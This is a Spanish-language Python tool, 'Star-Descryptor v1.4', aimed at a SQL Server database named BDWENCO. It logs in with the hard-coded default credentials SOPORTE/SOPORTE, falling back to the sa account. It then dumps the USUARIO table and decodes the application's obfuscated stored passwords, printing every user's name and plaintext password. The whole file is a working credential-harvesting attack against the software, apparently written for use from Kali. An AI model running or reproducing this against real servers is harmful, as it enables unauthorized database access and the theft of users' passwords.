# -*- coding: utf-8 -*-
import sys
import getpass

BANNER = r"""
  ____  _____  _    ____      ____  _____ ____   ____  ______   _______ ___  ____
 / ___||_   _|/ \  |  _ \    |  _ \| ____/ ___| / ___|  _ \ \ / /  ___|_ _|/ ___| 
 \___ \  | | / _ \ | |_) |   | | | |  _| \___ \| |   | |_) \ V /|___ \ | || |  _ 
  ___) | | |/ ___ \|  _ <    | |_| | |___ ___) | |___|  _ < | |  ___) || || |_| |
 |____/  |_/_/   \_\_| \_\   |____/|_____|____/ \____|_| \_\|_| |____/___| \____|
"""

def print_banner():
    print("=" * 82)
    print(BANNER)
    print("  >> Star-Descryptor v1.4  |  by mr.r360  |  remoto360.com <<")
    print("=" * 82)
    print()

# ─────────────────────────────────────────────
#  ALGORITMO DE DESCIFRADO
# ─────────────────────────────────────────────
def descifrar(texto_cifrado):
    bytes_cifrados = texto_cifrado.encode('latin-1')
    resultado = []
    for i, byte_val in enumerate(bytes_cifrados):
        pos = i % 8
        bloque_inicio = (i // 8) * 8
        c1_val = bytes_cifrados[bloque_inicio + 1] if len(bytes_cifrados) > bloque_inicio + 1 else 0
        llave_dinamica = 5 - (c1_val % 10)
        if pos == 0:
            origen = byte_val + 5
        elif pos == 1 or pos == 3:
            origen = byte_val + 36
        elif pos == 2 or pos == 4:
            origen = byte_val + llave_dinamica
        elif pos == 5:
            origen = byte_val + 32
        elif pos == 6:
            origen = byte_val // 2
        elif pos == 7:
            origen = byte_val + 37
        resultado.append(chr(origen % 256))
    return "".join(resultado)


# ─────────────────────────────────────────────
#  CONEXIÓN A SQL SERVER
# ─────────────────────────────────────────────
def conectar(ip, sql_user, sql_pass, instancia=None):
    try:
        import pyodbc
    except ImportError:
        print("\n[!] ERROR: pyodbc no está instalado.")
        print("    Ejecuta: apt-get install -y python3-pyodbc")
        print("    En Kali: pip3 install pyodbc --break-system-packages\n")
        sys.exit(1)

    servidor = f"{ip}\\{instancia}" if instancia else ip
    drivers = [
        "ODBC Driver 18 for SQL Server",
        "ODBC Driver 17 for SQL Server",
        "ODBC Driver 13 for SQL Server",
    ]
    conn_str_base = (
        f"SERVER={servidor};DATABASE=BDWENCO;"
        f"UID={sql_user};PWD={sql_pass};"
        "TrustServerCertificate=yes;Connection Timeout=8;"
    )
    for driver in drivers:
        try:
            conn = pyodbc.connect(f"DRIVER={{{driver}}};" + conn_str_base)
            print(f"[+] Conectado | driver: {driver} | usuario: {sql_user}")
            return conn
        except pyodbc.Error:
            continue
    return None


def leer_usuarios(conn):
    cursor = conn.cursor()
    cursor.execute("""
        SELECT USU_CODIGO, EMP_CODIGO, USU_NOMBRE, USU_PASSWORD
        FROM BDWENCO.dbo.USUARIO
        ORDER BY USU_CODIGO
    """)
    return cursor.fetchall()


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
print_banner()

ip = input("  IP del servidor SQL Server  : ").strip()
if not ip:
    print("[!] IP requerida.")
    sys.exit(1)

conn    = None
sa_pass = None

# ── Intento 1: SOPORTE / SOPORTE ──
print(f"\n[~] Probando SOPORTE / SOPORTE ...")
conn = conectar(ip, "SOPORTE", "SOPORTE")

# ── Intento 2: sa + contraseña pedida ──
if not conn:
    print("[!] Falló con SOPORTE.")
    sa_pass = getpass.getpass("\n  Contraseña del usuario sa   : ")
    print(f"[~] Probando sa ...")
    conn = conectar(ip, "sa", sa_pass)

# ── Intento 3: pedir instancia ──
if not conn:
    print(f"[!] No se pudo conectar a {ip} con instancia por defecto.")
    instancia = input("  Nombre de instancia (ej: SQLEXPRESS) : ").strip()
    if instancia:
        print(f"[~] Reintentando SOPORTE con instancia {instancia}...")
        conn = conectar(ip, "SOPORTE", "SOPORTE", instancia)
        if not conn and sa_pass:
            print(f"[~] Reintentando sa con instancia {instancia}...")
            conn = conectar(ip, "sa", sa_pass, instancia)

if not conn:
    print("[!] Conexión fallida. Verifica IP, instancia, firewall o puerto 1433.")
    sys.exit(1)

try:
    print("\n[~] Leyendo tabla USUARIO...\n")
    usuarios = leer_usuarios(conn)

    if not usuarios:
        print("[!] La tabla USUARIO está vacía.")
        sys.exit(0)

    col_w = [12, 12, 28, 22, 22]
    headers = ["USU_CODIGO", "EMP_CODIGO", "USU_NOMBRE", "PWD CIFRADO", "PWD DESCIFRADO"]
    sep = "─" * (sum(col_w) + len(col_w) * 3 + 1)

    print(sep)
    print(" " + " | ".join(h.ljust(col_w[i]) for i, h in enumerate(headers)))
    print(sep)

    for row in usuarios:
        codigo  = str(row[0] or "").strip()
        emp     = str(row[1] or "").strip()
        nombre  = str(row[2] or "").strip()
        pwd_enc = str(row[3] or "").strip()

        try:
            pwd_dec = descifrar(pwd_enc) if pwd_enc else "(vacío)"
        except Exception as e:
            pwd_dec = f"[ERR: {e}]"

        valores = [codigo, emp, nombre, pwd_enc, pwd_dec]
        linea = " | ".join(str(v).ljust(col_w[i])[:col_w[i]] for i, v in enumerate(valores))
        print(f" {linea}")

    print(sep)
    print(f"\n[+] Total usuarios procesados: {len(usuarios)}")
    print(f"[+] Star-Descryptor v1.4 — remoto360.com\n")

except Exception as e:
    print(f"[!] Error al leer datos: {e}")
finally:
    conn.close()
